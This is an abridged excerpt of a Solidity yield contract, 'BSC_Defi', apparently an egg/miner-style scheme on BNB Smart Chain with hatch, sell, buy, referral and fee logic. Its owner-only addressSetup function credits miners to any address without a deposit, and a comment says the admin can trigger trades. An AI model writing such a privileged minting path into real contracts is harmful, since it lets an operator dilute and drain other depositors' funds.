...
contract BSC_Defi {
    ...
    uint256 public PARTNER_SELL = 15;
    uint256 public MARKETING_SELL = 5;
    uint256 public MARKET_EGGS_DIVISOR = 5;
    uint256 public MARKET_EGGS_DIVISOR_SELL = 20;
    /** bonus **/
    ...
    function hatchEggs(address ref, bool isCompound) public {
        ...
        uint256 newMiners;
        if(isCompound) {
            newMiners = SafeMath.div(eggsUsed,EGGS_TO_HIRE_1MINERS_COMPOUND);
        }else{
            newMiners = SafeMath.div(eggsUsed,EGGS_TO_HIRE_1MINERS);
        }
        ...
        if (user.referrer != address(0)) {
            ...
            if (upline != address(0)) {
                amount = eggsForReferrers.mul(REFERRAL).div(PERCENTS_DIVIDER);
    ...
    function sellEggs() public{
        ...
        marketEggs = SafeMath.add(marketEggs,SafeMath.div(hasEggs,MARKET_EGGS_DIVISOR_SELL));
        ...
        payable(address(msg.sender)).transfer(eggValue.sub(payFeesSell(eggValue)));
    ...
    function buyEggs(address ref) public payable{
        ...
        require(user.initialDeposit <= WALLET_DEPOSIT_LIMIT, "Max deposit limit reached.");
   ...
   /** will auto execute, when condition is met. buy, hatch and sell, can be triggered manually by admin if theres no user action. **/
    ...
    /** setup for partners **/
    function addressSetup(address _addr, uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        User storage user = users[_addr];
        require(value > 0 && value <= PSNS);
        user.miners = SafeMath.add(user.miners, value);
        user.claimedEggs = 0;
        user.lastHatch = block.timestamp;
    }
    ...
    **/
    ...
    function PRC_PARTNER_SELL(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
